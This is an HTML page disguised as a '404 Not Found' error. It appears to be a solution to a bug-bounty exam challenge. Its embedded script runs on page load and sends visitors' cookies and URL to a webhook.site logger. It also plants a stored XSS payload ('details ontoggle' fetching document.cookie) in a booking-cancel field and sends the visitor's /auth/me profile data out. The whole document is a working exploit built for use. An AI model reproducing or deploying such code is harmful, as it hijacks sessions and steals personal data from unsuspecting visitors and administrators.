<!DOCTYPE html>
<html>
<head><title>System Maintenance</title></head>
<body>
    <script>
        // 1. YOUR UPDATED WEBHOOK URL
        const logger = "https://webhook.site/6222374a-b882-44ec-a12d-9671d3dd124c";
        const api = "https://api-bugbounty-exam.hashacademy.co/api";
        const myBookingId = "69dc17c6d9d06cf596929689"; 

        // 2. EXFILTRATION HELPER
        function send(label, data) {
            const body = btoa(JSON.stringify({ label, data }));
            new Image().src = `${logger}/?type=${label}&d=${body}`;
        }

        async function triggerExploit() {
            // Log if anyone (you or the bot) hits this page
            send("PAGE_HIT", { url: window.location.href, cookies: document.cookie });

            try {
                // 3. THE STORED XSS INJECTION
                // We use 'ontoggle' on a 'details' tag because the CSP allows 'self' scripts 
                // but often fails to block inline event handlers on non-script tags.
                const xssPayload = `<details open ontoggle="fetch('${logger}/?admin_cookie='+document.cookie)">`;

                const res = await fetch(`${api}/bookings/${myBookingId}/cancel`, {
                    method: "PUT",
                    headers: { "Content-Type": "application/json" },
                    credentials: "include",
                    body: JSON.stringify({ "reason": xssPayload })
                });

                const result = await res.json();
                send("INJECTION_STATUS", result);

                // 4. THE IDOR/IDENTITY LEAK
                // If the bot visits this page, it will try to fetch the bot's own profile info
                const meRes = await fetch(`${api}/auth/me`, { credentials: "include" });
                const meData = await meRes.json();
                send("SENSITIVE_DATA_LEAK", meData);

            } catch (e) {
                send("ERROR", e.message);
            }
        }

        triggerExploit();
    </script>
    <h1>404 Not Found</h1>
    <p>The requested resource was not found on this server.</p>
</body>
</html>
